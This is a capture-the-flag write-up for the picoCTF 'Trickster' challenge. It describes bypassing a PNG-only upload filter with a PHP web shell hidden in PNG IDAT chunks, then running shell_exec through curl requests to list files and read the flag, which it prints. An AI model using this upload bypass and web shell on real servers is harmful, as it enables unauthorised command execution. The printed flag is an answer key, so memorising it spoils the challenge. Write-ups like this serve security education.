# Trickster Writeup

Points: 300<br>
Challenge Author: Junias Bonou

Description:<br>
I found a web app that can help process images: PNG images only!

## Solution

In this challenge, we are presented with a webpage where we can upload png files that get processed.<br>
First, I tried uploading an arbitrary file. The error I got was useful, since it told me that the filname must contain .png (but not necessarily be a png file?)<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/896b9f94-5904-40eb-9e23-a0603f0c5c20)

Next, I uploaded a bogus file with .png at the end - No luck, some checks seem to be in place.<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/9f66320b-2101-4204-82f7-d6c8f41ade4c)

After some google-fu, I found the below (access via archive as original cert expired so the page wasn't accessible at the moment I wrote this):
https://web.archive.org/web/20240118041532/https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

Using the provided file, I changed its name name to explit.png.php to see if we could get away with this so it directly gets interpreted and executed as PHP.<br>
Finally, the moment of truth: sending the request to see if we successfully injected code (the file being stored in /uploads was a lucky guess, I admit it).<br>
```curl http://atlas.picoctf.net:58719/uploads/exploit.png.php?0=shell_exec --data "1=ls" --output - && echo```<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/5b269bc9-6723-450f-8d11-1c2eec399b9f)

While we can see that this lists the files uploaded, it doesn't show anything really interesting yet... So, another payload:<br>
```curl http://atlas.picoctf.net:58719/uploads/exploit.png.php?0=shell_exec --data "1=cd ..;ls" --output - && echo```<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/8ce77e41-ba20-4a0a-a210-e636386026f2)

In this directory, we can see more files. Especially the first one (GAZWIMLEGU2DQ.txt) seems interesting, so let's see what it contains!
```curl http://atlas.picoctf.net:58719/uploads/exploit.png.php?0=shell_exec --data "1=cd ..;cat GAZWIMLEGU2DQ.txt" --output - && echo```<br>
And there is our flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}<br>
![image](https://github.com/martinlaubscher/picoctf2024/assets/113263884/326eeaeb-b3e9-47f6-8dcb-0b3725218819)
